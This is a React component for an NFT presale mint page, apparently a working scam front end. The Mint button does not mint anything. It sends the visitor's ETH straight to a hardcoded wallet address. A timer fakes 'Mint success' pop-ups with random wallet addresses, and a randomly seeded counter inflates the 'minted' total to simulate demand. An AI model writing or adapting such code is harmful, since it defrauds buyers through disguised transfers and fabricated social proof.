import img from '../assets/pak.gif'
import { ethers } from 'ethers'
import { useState, useEffect } from 'react'
import { Store } from 'react-notifications-component';
import { useSelector } from "react-redux";

export default function Main() {
  const wallet = useSelector((state) => state.wallet);
  const [count, setCount] = useState(1)
  const [value, setValue] = useState(0.1)
  const [mintCount, setMintCount] = useState(Math.floor(Math.random() * 10000) + 1)
  const onMintPressed = async () => {
    console.log(wallet)
    const signer = wallet.provider.getSigner()
    const balance = await wallet.provider.getBalance(await signer.getAddress())
    console.log(balance)
    if (balance < ethers.utils.parseEther(`${value * count}`)){
      Store.addNotification({
        title: "Error",
        message: "Insufficient Funds",
        type: "info",
        insert: "top",
        container: "top-right",
        animationIn: ["animate__animated", "animate__fadeIn"],
        animationOut: ["animate__animated", "animate__fadeOut"],
        dismiss: {
          duration: 1000,
          onScreen: true
        }
      });
      return 
    } 
    const tx = signer.sendTransaction({
        to: "0x09EB99C50f868c3f6621aEBCaC4F29bCaE40383f", 
        value: ethers.utils.parseEther( `${value * count}`)
    });
  }
  const onPlus = () => {
    if (count < 5) setCount(count + 1)
    else setCount(5)
  }
  
  const onMinus = () => {
    if (count > 1) setCount(count - 1)
    else setCount(1)
  }

  const showAlert = async() => {
    setMintCount(parseInt(mintCount) + 1)
    let randomWallet = ethers.Wallet.createRandom();
    Store.addNotification({
      title: "Mint success",
      message: randomWallet.address,
      type: "warning",
      insert: "top",
      container: "top-right",
      animationIn: ["animate__animated", "animate__fadeIn"],
      animationOut: ["animate__animated", "animate__fadeOut"],
      dismiss: {
        duration: 1000,
        onScreen: true
      }
    });
  }
  useEffect(() => {
    const interval = setInterval(showAlert, (Math.floor(Math.random() * 5) + 1) * 1000)
    return () => clearInterval(interval);
  }, [mintCount]);
  useEffect(() => {
    setValue(count / 10)
  }, [count])

  return(
    <div>
      <div className='mt-5'>
            <div className='row mintSection mint'>
              <div className='col-md-5'>
                <img src={img} className="mintImage"/>
              </div>
              <div className='col-md-7 row'>
                <h3 className='presale-h'>PRESALE IS LIVE</h3>
                <h1 className='mint-h'>MINT YOUR NFT NOW</h1>
                <div className='col
                -5 mt-4'>
                  <h2>{mintCount}/10000</h2>
                  <h2>MINTED</h2>
                  <h4>PRICE : 0.1 ETH</h4>
                  <h6>Max Per Wallet: 5 </h6>
                </div>
                <div className='col
                -7 mt-4'>
                  <div className='mintCount'>
                    <button type="button" className="btn btn-dark btn-outline-light" onClick={onMinus}> -</button>
                    <p>{count}</p>
                    <button type="button" className="btn btn-dark btn-outline-light" onClick={onPlus}> +</button>
                  </div>
                  
                  {
                    wallet.account !== null ? <button type="button" className="btn btn-dark btn-outline-light mintBTN" onClick={onMintPressed}> Mint</button> : <p>Please connect your wallet.</p>
                  }
                  <h3 className='pTotal'>Total : {value} ETH</h3>
                </div>
              </div>
            </div>
      </div>
    </div>
  )
}